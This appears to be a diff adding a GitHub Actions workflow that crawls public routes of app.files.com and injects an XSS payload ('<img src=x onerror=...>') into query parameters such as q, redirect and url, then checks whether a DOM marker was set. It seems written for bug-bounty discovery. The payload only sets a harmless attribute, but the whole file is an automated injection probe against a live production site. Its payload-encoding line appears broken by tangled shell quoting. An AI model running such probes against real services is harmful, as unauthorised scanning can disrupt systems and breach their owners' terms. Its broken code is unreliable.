@@ -1,0 +1,84 @@
+name: Files.com Public Route DOM Injection Discovery
+
+on:
+  push:
+    paths:
+      - ".github/workflows/files-public-route-xss.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  discover:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install browser
+        run: |
+          npm install -g agent-browser
+          agent-browser install
+      - name: Crawl public routes and test harmless DOM marker payload
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p public-route-evidence
+          agent-browser open "https://app.files.com/" >/dev/null 2>&1
+          agent-browser wait 2000 >/dev/null 2>&1 || true
+          links=$(agent-browser eval 'JSON.stringify(Array.from(document.querySelectorAll("a[href]")).map(a=>a.href).filter(u=>u.startsWith("https://app.files.com/")).slice(0,80))' 2>/dev/null || echo '[]')
+          printf '%s' "$links" > /tmp/links.json
+          python3 - <<'PY'
+          import json,urllib.parse
+          try: arr=json.load(open("/tmp/links.json"))
+          except: arr=[]
+          out=[]
+          for u in arr:
+              p=urllib.parse.urlsplit(u)
+              clean=urllib.parse.urlunsplit((p.scheme,p.netloc,p.path,"",""))
+              if clean not in out: out.append(clean)
+          open("/tmp/routes.txt","w").write("\n".join(out[:40])+"\n")
+          PY
+
+          payload='<img src=x onerror="document.documentElement.setAttribute(&quot;data-h1xss&quot;,&quot;1&quot;)">'
+          enc=$(python3 -c 'import urllib.parse; print(urllib.parse.quote('"'"'$payload'"'"'"'"'"',safe=""))')
+          : > public-route-evidence/results.txt
+          findings=0
+          while IFS= read -r base; do
+            [ -n "$base" ] || continue
+            for key in q query search next redirect redirect_to return_to url continue; do
+              url="$base?$key=$enc"
+              agent-browser close >/dev/null 2>&1 || true
+              agent-browser open "$url" >/dev/null 2>&1 || continue
+              agent-browser wait 900 >/dev/null 2>&1 || true
+              marker=$(agent-browser eval 'document.documentElement.getAttribute("data-h1xss")' 2>/dev/null || true)
+              current=$(agent-browser get url 2>/dev/null || true)
+              title=$(agent-browser get title 2>/dev/null || true)
+              printf '%s\t%s\t%s\t%s\n' "$url" "$marker" "$title" "$current" >> public-route-evidence/results.txt
+              if [ "$marker" = "1" ]; then
+                findings=$((findings+1))
+                printf 'FINDING\t%s\n' "$url" >> public-route-evidence/results.txt
+                break 2
+              fi
+            done
+          done < /tmp/routes.txt
+          agent-browser close >/dev/null 2>&1 || true
+
+          if [ "$findings" -gt 0 ]; then
+            cat > public-route-evidence/report.md <<'EOF'
+          # DOM injection candidate
+          
+          A controlled browser marker executed on an in-scope Files.com public route. Exact reproduction data is in results.txt. Candidate requires manual validation and duplicate screening.
+          EOF
+          else
+            cat > public-route-evidence/report.md <<'EOF'
+          # NO VERIFIED PUBLIC ROUTE DOM INJECTION
+          
+          The crawled public routes did not execute the controlled marker payload.
+          EOF
+          fi
+      - name: Upload evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: files-public-route-dom-injection
+          path: public-route-evidence
